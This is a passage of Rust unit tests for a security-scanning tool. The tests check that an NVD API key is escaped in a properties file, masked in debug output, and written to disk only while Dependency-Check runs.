    assert_eq!(props("a=b:c#d!e\\f"), "nvd.api.key=a\\=b\\:c\\#d\\!e\\\\f\n");
    assert_eq!(props(" lead\tin\r"), "nvd.api.key=\\ lead\\tin\\r\n");
    assert_eq!(props("é😀"), "nvd.api.key=\\u00E9\\uD83D\\uDE00\n");
    assert_eq!(props("in side"), "nvd.api.key=in side\n", "only a leading space is escaped");
}

/// An empty `NVD_API_KEY` sets no key, and a key is never shown: not by
/// `Debug`, and so not by any `Debug` of the environment that carries it.
#[test]
fn an_empty_key_sets_none_and_a_key_never_prints() {
    assert_eq!(super::NvdApiKey::new(""), None);
    let env = ScanEnvironment { user_dir: None, search_path: None, tools_dir: None, nvd_api_key: nvd_key() };
    let shown = format!("{env:?} {:#?}", env.nvd_api_key);
    assert!(!shown.contains(NVD_KEY) && shown.contains(super::mask::MASK), "{shown}");
}

/// The key file exists only while Dependency-Check runs: with a key set, no
/// other scanner's run ever has one beside it.
#[test]
fn no_key_file_exists_while_another_scanner_runs() {
    let w = World::new(PROJECT);
    let file = w.root.join(OUTPUT_DIR).join(super::NVD_KEY_FILE);
    let seen = w.rec.join("keyfile.seen");
    let check = format!("if [ -e '{}' ]; then : > '{}'; fi", file.display(), seen.display());
    w.stub_at(&w.bin.join("semgrep"), "semgrep", "semgrep", 0, &check);
    let report = w.open().unwrap().with_nvd_api_key(nvd_key()).scan(&Selection::Only(strings(&["semgrep"]))).unwrap();
    assert!(matches!(outcome(&report, "semgrep").outcome, Outcome::Ran { .. }), "{report:?}");
    assert_eq!(w.runs("semgrep").len(), 1, "semgrep ran, so the check ran");
    assert!(!seen.exists(), "the key file existed while semgrep ran");
}

/// A key file Logos cannot write fails Dependency-Check before it starts,
/// naming the file: it never runs without the key the user set.
#[test]
fn a_key_file_that_cannot_be_written_fails_dependency_check_before_it_starts() {
    let w = World::new(PROJECT);
    dependency_check_stub(&w, 0, "");
    // A directory in the file's place, with an entry, so neither the sweep nor
    // the run can remove it.
    let file = w.root.join(OUTPUT_DIR).join(super::NVD_KEY_FILE);
    fs::create_dir_all(file.join("kept")).unwrap();
    let report = scan_dependency_check(&w, nvd_key());
    let Outcome::Failed { exit_code: None, stderr } = &outcome(&report, "dependency-check").outcome else {
        panic!("{report:?}")
    };
    assert!(stderr.starts_with("could not write the NVD API key file") && stderr.contains(super::NVD_KEY_FILE), "{stderr}");
    assert!(!stderr.contains(NVD_KEY), "{stderr}");
    assert!(w.runs("dependency-check").is_empty(), "Dependency-Check started without its key");
}
